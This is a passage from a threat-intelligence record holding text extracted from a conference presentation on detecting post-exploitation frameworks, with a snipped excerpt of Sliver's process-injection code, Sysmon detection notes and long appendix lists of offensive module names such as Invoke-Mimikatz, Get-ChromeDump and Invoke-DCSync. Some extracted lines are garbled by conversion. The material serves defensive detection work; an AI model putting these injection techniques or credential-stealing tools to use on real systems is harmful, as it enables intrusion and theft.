presentation\n\n\n-----\n\n|Item|Value|\n|---|---|\n\n\n###### Script block\n\n\n\n###### • Invoke-Mimikatz\n • powercat\n\n\n-----\n\n### • Sliver executes C# tools using process injection\n\n#### – The default injection target is notepad.exe\n\n\n###### windowsDefaultHostProc = `c:¥windows¥system32¥notepad.exe`\n\n\n[https://github.com/BishopFox/sliver/blob/master/client/command/alias/load.go#L49](https://github.com/BishopFox/sliver/blob/master/client/command/alias/load.go#L49)\n\n#### – Optionally runs as its own thread\n\n### • Sliver uses CreateRemoteThread with process injection\n\n#### – CreateRemoteThread can be monitored by Sysmon\n\n\n-----\n\n###### func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uint32) (string, error) {\n <…snip…> cmd, err := startProcess(process, processArgs, ppid, &stdoutBuf, &stderrBuf, true) <…snip…>\n handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))\n <…snip…> err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)\n <…snip…> threadHandle, err := injectTask(lpTargetHandle, data, false) <…snip…> }\n\n\n-----\n\n###### func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uint32) (string, error) {\n\n\n###### <…snip…> cmd, err := startProcess(process, processArgs, ppid, &stdoutBuf, &stderrBuf, true) <…snip…>\n handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))\n\n### Create injection destination process and\n\n###### <…snip…>\n\n### inject the C# tool\n\n###### err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)\n <…snip…> threadHandle, err := injectTask(lpTargetHandle, data, false) <…snip…> }\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Parent Process|<Sliver process>|\n\n\n###### Command (d f l ) ¥ i d ¥ 32¥ d \"\"\n\n\n-----\n\n-----\n\n[https://github.com/BishopFox/sliver/blob/master/implant/sliver/taskrunner/task_windows.go#L66-L132](https://github.com/BishopFox/sliver/blob/master/implant/sliver/taskrunner/task_windows.go#L66-L132)\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Parent Process|<Sliver process>|\n\n\n-----\n\n# Wrap-up\n\n\n-----\n\n### • Summary\n\n#### – Explained the MITRE ATT&CK Techniques of various Post Exploitation Frameworks – Explained individual indicators and their similarities\n\n### • Future works\n\n#### – Create and share detection rules for Sigma – Analyze external tools that are used as modules\n\n\n-----\n\n# Appendix\n\n\n-----\n\n# Extra Threat Intelligence ~ Indicators of External Tools Usage ~\n\n\n-----\n\n- Add-RemoteRegBackdoor\n\n- Configure-Victim\n\n- Create-HotKeyLNK\n\n- CredManMain\n\n- Dump\n\n- Find-ComputersWithRemoteAccessPolicies\n\n- Get-ExecutionCommand\n\n- Get-GPPPassword\n\n- Get-InjectedThread\n\n- Get-OSTokenInformation\n\n- Get-RemoteCachedCredential\n\n- Get-RemoteLocalAccountHash\n\n- Get-RemoteMachineAccountHash\n\n- Get-ScheduledTaskComHandler\n\n- Invoke-ADSBackdoor\n\n- Invoke-AllChecks\n\n- Invoke-AuditGPOReport\n\n\n\n- Invoke-DCOM\n\n- Invoke-DCOMObjectScan\n\n- Invoke-DCOMPowerPointPivot\n\n- Invoke-ExcelMacroPivot\n\n- Invoke-ExecutionCommand\n\n- Invoke-InternalMonologue\n\n- Invoke-Inveigh\n\n- Invoke-Mimikatz\n\n- Invoke-PowerThIEf\n\n- Invoke-RegisterRemoteSchema\n\n- Invoke-WMILM\n\n\n-----\n\n- Add-KeePassConfigTrigger\n\n- Add-NetUser\n\n- Disable-SecuritySettings\n\n- Exploit-JBoss\n\n- Exploit-Jenkins\n\n- Fetch-Brute\n\n- Find-AllVulns\n\n- Find-DomainProcess\n\n- Find-DomainShare\n\n- Find-DomainUserLocation\n\n- Find-Fruit\n\n- Find-InterestingFile\n\n- Find-KeePassconfig\n\n- Find-LocalAdminAccess\n\n- Find-ProcessDLLHijack\n\n- Find-TrustedDocuments\n\n- Get-ADIDNSPermission\n\n- Get-ADIDNSZone\n\n\n\n- Get-BrowserData\n\n- Get-ChromeDump\n\n- Get-ClipboardContents\n\n- Get-ComputerDetails\n\n- Get-DomainComputer\n\n- Get-DomainController\n\n- Get-DomainDFSshare\n\n- Get-DomainFileServer\n\n- Get-DomainForeignGroupMember\n\n- Get-DomainForeignUser\n\n- Get-DomainGPO\n\n- GetDomainGPOComputerLocalGroup\nMapping\n\n- GetDomainGPOUserLocalGroupMappin\ng\n\n- Get-DomainGroup\n\n- Get-DomainGroupMember\n\n\n\n- Get-DomainOU\n\n- Get-DomainObjectAcl\n\n- Get-DomainPolicyData\n\n- Get-DomainSID\n\n- Get-DomainSite\n\n- Get-DomainSubnet\n\n- Get-DomainTrust\n\n- Get-DomainTrustMapping\n\n- Get-DomainUser\n\n- Get-EmailItems\n\n- Get-Forest\n\n- Get-ForestDomain\n\n- Get-FoxDump\n\n- Get-GPOComputer\n\n\n-----\n\n- Get-GPPPassword\n\n- Get-IndexedItem\n\n- Get-KeePassconfig\n\n- Get-KerberosServiceTicket\n\n- Get-KeyStrokes\n\n- Get-LAPSPasswords\n\n- Get-NetLocalGroup\n\n- Get-NetLoggedon\n\n- Get-NetRDPSession\n\n- Get-NetSession\n\n- Get-PathAcl\n\n- Get-Proxy\n\n- Get-RickAstley\n\n- Get-SPN\n\n- Get-SQLColumnSampleData\n\n- Get-SQLInstanceDomain\n\n- Get-SQLQuery\n\n- Get-SQLServerInfo\n\n\n\n- Get-Schwifty\n\n- Get-Screenshot\n\n- Get-SecurityPackages\n\n- Get-SharpChromium\n\n- Get-SiteListPassword\n\n- Get-SubFolders\n\n- Get-System\n\n- Get-SystemDNSServer\n\n- Get-UACLevel\n\n- Get-USBKeyStrokes\n\n- Get-VaultCredential\n\n- Get-WMIRegCachedRDP\nConnection\n\n- Get-WinUpdates\n\n- Install-SSP\n\n- Install-ServiceBinary\n\n- Invoke-ARPScan\n\n- Invoke-AllChecks\nI k B kd LNK\n\n\n\n- Invoke-BloodHound\n\n- Invoke-Boolang\n\n- Invoke-BypassUAC\n\n- InvokeBypassUACTokenManipulation\n\n- Invoke-ClearScript\n\n- Invoke-CredentialInjection\n\n- Invoke-CredentialPhisher\n\n- Invoke-DCOM\n\n- Invoke-DeadUserBackdoor\n\n- Invoke-DisableMachineAcctChange\n\n- Invoke-DllInjection\n\n- Invoke-DomainPasswordSpray\n\n- Invoke-DowngradeAccount\n\n\n-----\n\n- Invoke-DownloadFile\n\n- Invoke-DropboxUpload\n\n- Invoke-EgressCheck\n\n- Invoke-EnvBypass\n\n- Invoke-EternalBlue\n\n- Invoke-EventLogBackdoor\n\n- Invoke-EventVwrBypass\n\n- Invoke-ExecuteMSBuild\n\n- Invoke-FileFinder\n\n- Invoke-FodHelperBypass\n\n- Invoke-FodhelperProgIDs\n\n- Invoke-HostRecon\n\n- Invoke-InternalMonologue\n\n- Invoke-Inveigh\n\n- Invoke-InveighRelay\n\n- Invoke-IronPython\n\n- Invoke-IronPython3\n\n- Invoke-KeeThief\n\n\n\n- Invoke-LockWorkStation\n\n- Invoke-MS16032\n\n- Invoke-MS16135\n\n- Invoke-MailSearch\n\n- Invoke-Message\n\n- Invoke-MetasploitPayload\n\n- Invoke-Mimikatz\n\n- Invoke-NTLMExtract\n\n- Invoke-NetRipper\n\n- Invoke-Nightmare\n\n- Invoke-NinjaCopy\n\n- Invoke-Ntsd\n\n- Invoke-PSInject\n\n- Invoke-Paranoia\n\n- Invoke-Phant0m\n\n- Invoke-PhishingLnk\n\n- Invoke-PortFwd\n\n- Invoke-Portscan\n\n\n\n- Invoke-PrintDeamon\n\n- Invoke-PrivescCheck\n\n- Invoke-ProcessKiller\n\n- Invoke-Prompt\n\n- Invoke-PsExec\n\n- Invoke-RIDHijacking\n\n- Invoke-ReflectivePEInjection\n\n- Invoke-ResolverBackdoor\n\n- Invoke-ReverseDNSLookup\n\n- Invoke-ReverseSocksProxy\n\n- Invoke-RunAs\n\n- Invoke-SDCLTBypass\n\n\n-----\n\n- Invoke-SMBAutoBrute\n\n- Invoke-SMBExec\n\n- Invoke-SMBLogin\n\n- Invoke-SMBScanner\n\n- Invoke-SQLOSCMD\n\n- Invoke-SSHCommand\n\n- Invoke-SSharp\n\n- Invoke-SauronEye\n\n- Invoke-Script\n\n- Invoke-SearchGAL\n\n- Invoke-SendMail\n\n- Invoke-ServiceAbuse\n\n- Invoke-SessionGopher\n\n- Invoke-SharpChiselClient\n\n- Invoke-SharpLoginPrompt\n\n- Invoke-SharpSecDump\n\n- Invoke-Shellcode\n\n- Invoke-ShellcodeMSIL\n\n\n\n- Invoke-SpoolSample\n\n- Invoke-SweetPotato\n\n- Invoke-Tater\n\n- Invoke-Thunderstruck\n\n- Invoke-TokenManipulation\n\n- Invoke-VeeamGetCreds\n\n- Invoke-Vnc\n\n- Invoke-VoiceTroll\n\n- Invoke-WScriptBypassUAC\n\n- Invoke-Watson\n\n- Invoke-WdigestDowngrade\n\n- Invoke-WinEnum\n\n- Invoke-WireTap\n\n- Invoke-Wlrmdr\n\n- Invoke-ZeroLogon\n\n- Invoke-ZipFolder\n\n- Invoke-sid_to_user\n\n- Invoke-winPEAS\n\n\n\n- New-HoneyHash\n\n- Out-Minidump\n\n- Remove-KeePassConfigTrigger\n\n- Restart-Computer\n\n- Restore-ServiceBinary\n\n- Set-DomainObject\n\n- Set-MacAttribute\n\n- Set-Wallpaper\n\n- Start-MonitorTCPConnections\n\n- Start-ProcessAsUser\n\n- Start-WebcamRecorder\n\n- Test-Login\n\n- View-Email\n\n- Write-HijackDll\n\n- powercat\n\n\n-----\n\n- Add-ObjectAcl\n\n- ArpScan\n\n- Brute-Ad\n\n- Brute-LocAdmin\n\n- Bypass-UAC\n\n- ConvertTo-Shellcode\n\n- Cred-Popper\n\n- Decrypt-RDCMan\n\n- Dump-NTDS\n\n- Find-AllVulns\n\n- Find-DomainShare\n\n- Get-ComputerInfo\n\n- Get-CreditCardData\n\n- Get-DFSshare\n\n- Get-DomainComputer\n\n- Get-DomainGroupMember\n\n- Get-DomainUser\n\n- Get-GPPAutologon\n\n\n\n- Get-Hash\n\n- Get-IdleTime\n\n- Get-InjectedThread\n\n- Get-Ipconfig\n\n- Get-Keystrokes\n\n- Get-LAPSPasswords\n\n- Get-LocAdm\n\n- Get-MSHotFixes\n\n- Get-NetComputer\n\n- Get-NetDomain\n\n- Get-NetDomainController\n\n- Get-NetForest\n\n- Get-NetForestDomain\n\n- Get-NetGroup\n\n- Get-NetGroupMember\n\n- Get-NetLocalGroupMember\n\n- Get-NetShare\n\n- Get-NetUser\n\n\n\n- Get-ObjectAcl\n\n- Get-PassNotExp\n\n- Get-PassPol\n\n- Get-RecentFiles\n\n- Get-ScreenshotAllWindows\n\n- Get-ServicePerms\n\n- Get-UserInfo\n\n- Get-WLANPass\n\n- Get-WMIRegCachedRDPConnection\n\n- Get-WMIRegLastLoggedOn\n\n- Get-WMIRegMountedDrive\n\n- Inject-Shellcode\n\n\n-----\n\n- Inveigh\n\n- Inveigh-Relay\n\n- Invoke-ACLScanner\n\n- Invoke-AllChecks\n\n- Invoke-Arpscan\n\n- Invoke-BloodHound\n\n- Invoke-DCSync\n\n- Invoke-DaisyChain\n\n- Invoke-EDRChecker\n\n- Invoke-EternalBlue\n\n- Invoke-EventVwrBypass\n\n- Invoke-HostEnum\n\n- Invoke-Hostscan\n\n- Invoke-Inveigh\n\n- Invoke-Kerberoast\n\n- Invoke-MS16-032\n\n- Invoke-MapDomainTrust\n\n- Invoke-Mimikatz\n\n\n\n- Invoke-Pipekat\n\n- Invoke-Portscan\n\n- Invoke-PowerDump\n\n- Invoke-PsExec\n\n- Invoke-PsUACme\n\n- Invoke-ReflectivePEInjection\n\n- Invoke-ReverseDnsLookup\n\n- Invoke-Runas\n\n- Invoke-SMBClient\n\n- Invoke-SMBExec\n\n- Invoke-ShareFinder\n\n- Invoke-Shellcode\n\n- Invoke-Sniffer\n\n- Invoke-SqlQuery\n\n- Invoke-Tater\n\n- Invoke-TheHash\n\n- Invoke-TokenManipulation\n\n- Invoke-URLCheck\n\n\n\n- Invoke-WMIChecker\n\n- Invoke-WMICommand\n\n- Invoke-WMIEvent\n\n- Invoke-WScriptBypassUAC\n\n- Invoke-WinRMSession\n\n- New-JScriptShell\n\n- New-ZipFile\n\n- Out-Minidump\n\n- Portscan\n\n- Remove-WMIEvent\n\n- Resolve-IPAddress\n\n- RunAs-NetOnly\n\n- Set-LHSTokenPrivilege\n\n- Test-ADCredential\n\n- cve-2016-9192\n\n- invoke-smblogin\n\n- powercat\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://jsac.jpcert.or.jp/archive/2024/pdf/JSAC2024_1_9_takeda_furukawa_en.pdf"
    ],
    "report_names": [
        "JSAC2024_1_9_takeda_furukawa_en.pdf"
    ],
    "threat_actors": [
        {
            "id": "46818902-c96d-445c-afdb-075ef6b4afab",
            "created_at": "2023-02-18T02:04:24.443028Z",
            "updated_at": "2025-03-27T02:02:10.068682Z",
            "deleted_at": null,
            "main_name": "Operation RestyLink",
            "aliases": [
                "Earth Yako",
                "Operation Enelink"
            ],
            "source_name": "ETDA:Operation RestyLink",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "65e1eee1-bc35-4093-9554-1a668e1bc30a",
            "created_at": "2024-02-08T02:00:04.320426Z",
            "updated_at": "2025-03-27T02:00:03.328607Z",
            "deleted_at": null,
            "main_name": "Earth Yako",
            "aliases": [
                "Operation RestyLink",
                "Enelink"
            ],
            "source_name": "MISPGALAXY:Earth Yako",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1706753208,
    "ts_updated_at": 1743041493,
    "ts_creation_date": 1705594607,
    "ts_modification_date": 1705594607,
    "files": {
        "pdf": "https://archive.orkl.eu/47ed28849959714f322ab7b3d74aecc6c2c8ae51.pdf",
        "text": "https://archive.orkl.eu/47ed28849959714f322ab7b3d74aecc6c2c8ae51.txt",
        "img": "https://archive.orkl.eu/47ed28849959714f322ab7b3d74aecc6c2c8ae51.jpg"
    }
}